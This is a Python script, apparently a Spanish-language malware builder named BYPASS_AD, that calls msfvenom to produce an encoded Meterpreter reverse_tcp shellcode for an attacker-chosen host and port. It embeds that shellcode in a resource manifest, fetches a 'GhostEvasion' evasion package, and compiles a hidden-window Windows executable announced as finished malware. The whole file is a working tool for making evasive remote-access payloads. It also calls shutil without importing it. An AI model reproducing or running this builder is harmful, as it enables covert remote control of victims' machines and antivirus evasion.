import os
import time
import colorama


os.system("cls")

def banner():
    print(f"{colorama.Fore.GREEN}                                                         ")         
    print(f"{colorama.Fore.GREEN}    ______  ______  ___   __________      ___    ____    ")
    print(f"{colorama.Fore.GREEN}   / __ ) \/ / __ \/   | / ___/ ___/     /   |  / __ \   ")
    print(f"{colorama.Fore.GREEN}  / __  |\  / /_/ / /| | \__ \\__ \      / /| | / / / /  ")
    print(f"{colorama.Fore.GREEN} / /_/ / / / ____/ ___ |___/ /__/ /    / ___ |/ /_/ /    ")
    print(f"{colorama.Fore.GREEN}/_____/ /_/_/   /_/  |_/____/____/____/_/  |_/_____/     ")
    print(f"{colorama.Fore.GREEN}                                /_____/                  ")
    print(f"{colorama.Fore.RED}            credits:@Bl4ckShell2    by @ju4n4rev4lo        ")

banner()

lhost = input("LHOST: ")
lport = input("LPORT: ")
print(f"\n{colorama.Fore.BLACK}[*] Generando shellcode...")
time.sleep(4)

shellcode = os.system(f"msfvenom -p windows/x64/meterpreter/reverse_tcp lhost={lhost} lport={lport} EnableStageEncoding=true StageEncoder=x64/xor_dynamic EXITFUNC=thread -f hex -o shellcode.txt")

print(f"{colorama.Fore.BLACK}[*] Copiando shellcode...")
time.sleep(4)

shellcode_path = "shellcode.txt"
manifiesto_path = "manifiesto.txt"

with open(shellcode_path, 'r', encoding='utf-8') as shellcode_file:
    shellcode_content = shellcode_file.read().strip()

with open(manifiesto_path, 'r', encoding='utf-8') as manifiesto_file:
    lineas = manifiesto_file.readlines()

indice_inicio = lineas[8].find("#!")
indice_fin = lineas[8].find("$!") + len("$!")

nuevo_contenido = lineas[8][:indice_inicio] + "#!" + shellcode_content + "$!" + lineas[8][indice_fin:]
lineas[8] = nuevo_contenido

with open(manifiesto_path, 'w', encoding='utf-8') as manifiesto_file:
    manifiesto_file.writelines(lineas)

print(f"{colorama.Fore.BLACK}[*] Encryptando en archivo ejecutable.. ")
rsrc = shutil.which("rsrc")
if rsrc is not None:
    time.sleep(1.5)
else:
    os.system("go install github.com/akavel/rsrc@latest")
os.system("rsrc -manifest .\manifiesto.txt")
os.system("go mod init main")
os.system("go get github.com/BlackShell256/GhostEvasion/pkg/GhostEvasion")
os.system("go get golang.org/x/sys/windows")

print(f"{colorama.Fore.BLACK}[*] Copilando go...")
time.sleep(4)
os.system('go build -ldflags="-H=windowsgui -s -w"')
time.sleep(4)

print(f"{colorama.Fore.RED}Tu Malware ya esta creado. (main.exe)=)")
